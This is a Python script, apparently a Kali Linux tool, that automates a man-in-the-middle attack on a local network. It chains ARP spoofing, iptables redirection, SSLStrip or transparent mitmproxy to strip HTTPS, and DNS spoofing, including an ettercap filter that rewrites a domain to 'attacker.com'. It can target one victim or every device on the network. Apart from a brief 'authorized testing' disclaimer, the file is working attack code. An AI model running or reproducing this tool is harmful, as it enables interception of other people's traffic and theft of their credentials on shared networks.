#!/usr/bin/env python3
"""
HSTS Bypass and SSL/TLS MITM Attack Tool for Kali Linux

This script provides utilities for conducting HSTS bypass and MITM attacks for
authorized security testing purposes. It implements various techniques including
ARP spoofing, SSLStrip, DNS spoofing, and more.

REFERENCE: https://securedebug.com/mitm-attacks-and-ssl-bypass-in-kali-linux-17062025/

IMPORTANT: This tool should only be used in legal, authorized testing scenarios.
"""

import subprocess
import os
import sys
import time
import signal
import argparse
import logging
import re
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("hsts_bypass_kali.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("hsts_bypass_kali")

class HSTSBypassTester:
    def __init__(self, interface, gateway_ip, victim_ip=None, all_targets=False):
        """
        Initialize the HSTS Bypass Tester
        
        Args:
            interface (str): Network interface to use (e.g., eth0, wlan0)
            gateway_ip (str): Gateway/router IP address
            victim_ip (str): Target victim IP address (None for all devices)
            all_targets (bool): Target all devices on the network
        """
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip
        self.all_targets = all_targets
        self.processes = []
        
        # Validate inputs
        if not self._validate_interface():
            raise ValueError(f"Interface {interface} not found or not accessible")
            
        if not self._validate_ip(gateway_ip):
            raise ValueError(f"Invalid gateway IP format: {gateway_ip}")
            
        if victim_ip and not self._validate_ip(victim_ip):
            raise ValueError(f"Invalid victim IP format: {victim_ip}")
            
        logger.info(f"HSTSBypassTester initialized with interface={interface}, "
                   f"gateway={gateway_ip}, victim={victim_ip or 'all'}")
    
    def _validate_interface(self):
        """Validate if the given network interface exists"""
        try:
            result = subprocess.run(['ip', 'link', 'show', self.interface],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   check=False)
            return result.returncode == 0
        except Exception as e:
            logger.error(f"Error validating interface: {e}")
            return False
    
    def _validate_ip(self, ip):
        """Validate if the given string is a valid IP address"""
        pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
        match = re.match(pattern, ip)
        if not match:
            return False
            
        # Check if each octet is between 0-255
        for octet in match.groups():
            if int(octet) > 255:
                return False
        return True
    
    def _start_process(self, cmd, name):
        """Start a subprocess and add it to the process list"""
        try:
            logger.info(f"Starting {name}: {' '.join(cmd)}")
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.processes.append({"name": name, "process": proc, "cmd": cmd})
            logger.info(f"{name} started with PID {proc.pid}")
            return proc
        except Exception as e:
            logger.error(f"Failed to start {name}: {e}")
            return None
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding for MITM"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            logger.info("IP forwarding enabled")
            return True
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
            return False
            
    def setup_iptables(self, http_port=80, redirect_port=10000):
        """Setup iptables for traffic redirection"""
        try:
            # Clear any existing NAT rules
            subprocess.run(['iptables', '-t', 'nat', '-F'], check=True)
            
            # Set up HTTP redirection
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--destination-port', str(http_port),
                '-j', 'REDIRECT', '--to-port', str(redirect_port)
            ], check=True)
            
            logger.info(f"iptables configured to redirect port {http_port} to {redirect_port}")
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to setup iptables: {e}")
            return False
            
    def start_arp_spoofing(self, method="arpspoof"):
        """
        Start ARP spoofing attacks
        
        Args:
            method (str): Tool to use - "arpspoof", "ettercap", or "bettercap"
        """
        if method == "arpspoof":
            return self._start_arpspoof()
        elif method == "ettercap":
            return self._start_ettercap_arp()
        elif method == "bettercap":
            return self._start_bettercap_arp()
        else:
            logger.error(f"Unknown ARP spoofing method: {method}")
            return False
    
    def _start_arpspoof(self):
        """Start ARP spoofing using arpspoof command"""
        try:
            # If we're targeting a specific victim
            if self.victim_ip:
                # Spoof gateway to victim
                cmd1 = [
                    'arpspoof', '-i', self.interface,
                    '-t', self.victim_ip, self.gateway_ip
                ]
                proc1 = self._start_process(cmd1, "arpspoof-gateway-to-victim")
                
                # Spoof victim to gateway
                cmd2 = [
                    'arpspoof', '-i', self.interface,
                    '-t', self.gateway_ip, self.victim_ip
                ]
                proc2 = self._start_process(cmd2, "arpspoof-victim-to-gateway")
                
                return proc1 and proc2
            else:
                # Target all devices (broadcast)
                cmd = [
                    'arpspoof', '-i', self.interface,
                    self.gateway_ip
                ]
                proc = self._start_process(cmd, "arpspoof-broadcast")
                return proc is not None
        except Exception as e:
            logger.error(f"Failed to start arpspoof: {e}")
            return False
    
    def _start_ettercap_arp(self):
        """Start ARP spoofing using Ettercap"""
        try:
            if self.victim_ip:
                # Target specific victim
                cmd = [
                    'ettercap', '-T', '-q', '-i', self.interface,
                    '-M', 'arp:remote', '/' + self.gateway_ip + '//',
                    '/' + self.victim_ip + '//'
                ]
            else:
                # Target all devices
                cmd = [
                    'ettercap', '-T', '-q', '-i', self.interface,
                    '-M', 'arp:remote', '/' + self.gateway_ip + '//', '///'
                ]
                
            proc = self._start_process(cmd, "ettercap-arp")
            return proc is not None
        except Exception as e:
            logger.error(f"Failed to start ettercap: {e}")
            return False
    
    def _start_bettercap_arp(self):
        """Start ARP spoofing using Bettercap"""
        try:
            # Create a temporary config file for bettercap
            config_file = f"bettercap_config_{int(time.time())}.cap"
            
            with open(config_file, 'w') as f:
                f.write("set arp.spoof.targets ")
                if self.victim_ip:
                    f.write(self.victim_ip)
                else:
                    f.write(f"192.168.0.0/24") # Default subnet, adjust if needed
                    
                f.write("\narp.spoof on\n")
            
            cmd = [
                'bettercap', '-iface', self.interface, 
                '-caplet', config_file
            ]
            
            proc = self._start_process(cmd, "bettercap-arp")
            return proc is not None
        except Exception as e:
            logger.error(f"Failed to start bettercap: {e}")
            return False
    
    def start_sslstrip(self, port=10000):
        """Start SSLStrip for HSTS bypass"""
        try:
            log_file = f"sslstrip_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
            cmd = [
                'sslstrip', '-l', str(port), 
                '-w', log_file
            ]
            
            proc = self._start_process(cmd, "sslstrip")
            return proc is not None
        except Exception as e:
            logger.error(f"Failed to start SSLStrip: {e}")
            return False
    
    def start_mitmproxy(self, port=8080):
        """Start mitmproxy for SSL interception"""
        try:
            cmd = [
                'mitmproxy', '-p', str(port),
                '--mode', 'transparent'
            ]
            
            proc = self._start_process(cmd, "mitmproxy")
            return proc is not None
        except Exception as e:
            logger.error(f"Failed to start mitmproxy: {e}")
            return False
    
    def start_dns_spoofing(self, method="dnsspoof"):
        """Start DNS spoofing attacks"""
        if method == "dnsspoof":
            return self._start_dnsspoof()
        elif method == "bettercap":
            return self._start_bettercap_dns()
        elif method == "ettercap":
            return self._start_ettercap_dns()
        else:
            logger.error(f"Unknown DNS spoofing method: {method}")
            return False
    
    def _start_dnsspoof(self):
        """Start DNS spoofing using dnsspoof"""
        try:
            # Create a hosts file for DNS spoofing
            hosts_file = "dnsspoof_hosts.txt"
            with open(hosts_file, 'w') as f:
                f.write("# Example: redirect domains to attacker machine\n")
                f.write("# Format: <ip-address> <domain>\n")
                f.write("# Add your entries below\n")
                f.write("127.0.0.1 secure-example.com\n")
                
            cmd = [
                'dnsspoof', '-i', self.interface, 
                '-f', hosts_file
            ]
            
            proc = self._start_process(cmd, "dnsspoof")
            return proc is not None
        except Exception as e:
            logger.error(f"Failed to start dnsspoof: {e}")
            return False
    
    def _start_bettercap_dns(self):
        """Start DNS spoofing using Bettercap"""
        try:
            # Create a temporary config file for bettercap
            config_file = f"bettercap_dns_{int(time.time())}.cap"
            
            with open(config_file, 'w') as f:
                f.write("set dns.spoof.all true\n")
                f.write("set dns.spoof.domains secure-example.com\n")
                f.write("set dns.spoof.address 127.0.0.1\n")
                f.write("dns.spoof on\n")
            
            cmd = [
                'bettercap', '-iface', self.interface, 
                '-caplet', config_file
            ]
            
            proc = self._start_process(cmd, "bettercap-dns")
            return proc is not None
        except Exception as e:
            logger.error(f"Failed to start bettercap DNS spoofing: {e}")
            return False
    
    def _start_ettercap_dns(self):
        """Start DNS spoofing using Ettercap"""
        try:
            # Create an Ettercap filter file for DNS spoofing
            filter_file = "ettercap_dns.filter"
            with open(filter_file, 'w') as f:
                f.write('if (ip.proto == UDP && udp.dst == 53) {\n')
                f.write('   if (search(DATA.data, "secure-example.com")) {\n')
                f.write('      replace("secure-example.com", "attacker.com"); # Replace with your domain\n')
                f.write('      msg("DNS spoofing for secure-example.com");\n')
                f.write('   }\n')
                f.write('}\n')
            
            # Compile the filter
            subprocess.run(['etterfilter', filter_file, '-o', 'dns_spoof.ef'], check=True)
            
            # Run ettercap with the filter
            if self.victim_ip:
                cmd = [
                    'ettercap', '-T', '-q', '-F', 'dns_spoof.ef', '-i', self.interface,
                    '-M', 'arp:remote', '/' + self.gateway_ip + '//',
                    '/' + self.victim_ip + '//'
                ]
            else:
                cmd = [
                    'ettercap', '-T', '-q', '-F', 'dns_spoof.ef', '-i', self.interface,
                    '-M', 'arp:remote', '/' + self.gateway_ip + '//', '///'
                ]
            
            proc = self._start_process(cmd, "ettercap-dns")
            return proc is not None
        except Exception as e:
            logger.error(f"Failed to start ettercap DNS spoofing: {e}")
            return False
    
    def start_full_mitm_attack(self, method="sslstrip"):
        """Start a complete MITM attack with HSTS bypass"""
        success = True
        
        # Step 1: Enable IP forwarding
        if not self.enable_ip_forwarding():
            logger.error("Failed to enable IP forwarding, aborting attack")
            return False
        
        # Step 2: Setup iptables
        if not self.setup_iptables():
            logger.error("Failed to setup iptables, aborting attack")
            return False
            
        # Step 3: Start ARP spoofing
        if not self.start_arp_spoofing():
            logger.warning("Failed to start ARP spoofing, continuing with attack")
            success = False
            
        # Step 4: Start HSTS bypass method
        if method == "sslstrip":
            if not self.start_sslstrip():
                logger.error("Failed to start SSLStrip, aborting attack")
                return False
        elif method == "mitmproxy":
            if not self.start_mitmproxy():
                logger.error("Failed to start mitmproxy, aborting attack")
                return False
        else:
            logger.error(f"Unknown MITM method: {method}")
            return False
            
        # Step 5: Start DNS spoofing (optional)
        self.start_dns_spoofing()
        
        logger.info("Full MITM attack started successfully")
        return success
            
    def cleanup(self):
        """Cleanup all processes and settings"""
        logger.info("Starting cleanup process")
        
        # Kill all started processes
        for proc_info in self.processes:
            try:
                name = proc_info["name"]
                proc = proc_info["process"]
                logger.info(f"Terminating {name} (PID {proc.pid})")
                proc.terminate()
                proc.wait(timeout=3)
            except Exception as e:
                logger.error(f"Error terminating {name}: {e}")
                # Try to kill if terminate fails
                try:
                    proc.kill()
                except:
                    pass
        
        # Kill any remaining processes
        try:
            subprocess.run(['pkill', 'arpspoof'], check=False)
            subprocess.run(['pkill', 'ettercap'], check=False)
            subprocess.run(['pkill', 'bettercap'], check=False)
            subprocess.run(['pkill', 'sslstrip'], check=False)
            subprocess.run(['pkill', 'dnsspoof'], check=False)
            subprocess.run(['pkill', 'mitmproxy'], check=False)
        except Exception as e:
            logger.error(f"Error killing processes: {e}")
            
        # Reset iptables
        try:
            subprocess.run(['iptables', '-t', 'nat', '-F'], check=False)
            logger.info("iptables rules reset")
        except Exception as e:
            logger.error(f"Failed to reset iptables: {e}")
            
        # Disable IP forwarding
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
            logger.info("IP forwarding disabled")
        except Exception as e:
            logger.error(f"Failed to disable IP forwarding: {e}")
            
        # Clean up temporary files
        for file in ['dnsspoof_hosts.txt', 'ettercap_dns.filter', 'dns_spoof.ef']:
            try:
                if os.path.exists(file):
                    os.remove(file)
            except Exception as e:
                logger.error(f"Failed to remove {file}: {e}")
        
        logger.info("Cleanup completed")

def main():
    """Main function to parse arguments and run the attack"""
    parser = argparse.ArgumentParser(
        description="HSTS Bypass and MITM Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Target a specific device
  sudo python hsts_bypass_kali.py -i eth0 -g 192.168.1.1 -t 192.168.1.100
  
  # Target all devices on the network
  sudo python hsts_bypass_kali.py -i eth0 -g 192.168.1.1 -a
  
  # Use specific MITM method
  sudo python hsts_bypass_kali.py -i eth0 -g 192.168.1.1 -t 192.168.1.100 -m mitmproxy
        """
    )
    
    parser.add_argument('-i', '--interface', required=True,
                      help='Network interface to use (e.g., eth0, wlan0)')
    parser.add_argument('-g', '--gateway', required=True,
                      help='Gateway/router IP address')
    parser.add_argument('-t', '--target',
                      help='Target victim IP address')
    parser.add_argument('-a', '--all-targets', action='store_true',
                      help='Target all devices on the network')
    parser.add_argument('-m', '--method', default='sslstrip',
                      choices=['sslstrip', 'mitmproxy'],
                      help='MITM method to use')
    parser.add_argument('-v', '--verbose', action='store_true',
                      help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Configure logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Check if running as root
    if os.geteuid() != 0:
        logger.error("This script must be run as root")
        return 1
        
    # Check for target specification
    if not args.target and not args.all_targets:
        logger.error("You must specify either a target IP (-t) or use --all-targets (-a)")
        return 1
        
    # Initialize tester
    try:
        tester = HSTSBypassTester(
            interface=args.interface,
            gateway_ip=args.gateway,
            victim_ip=args.target,
            all_targets=args.all_targets
        )
    except ValueError as e:
        logger.error(f"Initialization error: {e}")
        return 1
        
    # Start attack
    try:
        logger.info(f"Starting MITM attack using {args.method} method")
        tester.start_full_mitm_attack(method=args.method)
        
        logger.info("Attack running. Press Ctrl+C to stop...")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Received interrupt, cleaning up...")
    finally:
        tester.cleanup()
    
    logger.info("Attack stopped")
    return 0

if __name__ == "__main__":
    sys.exit(main())
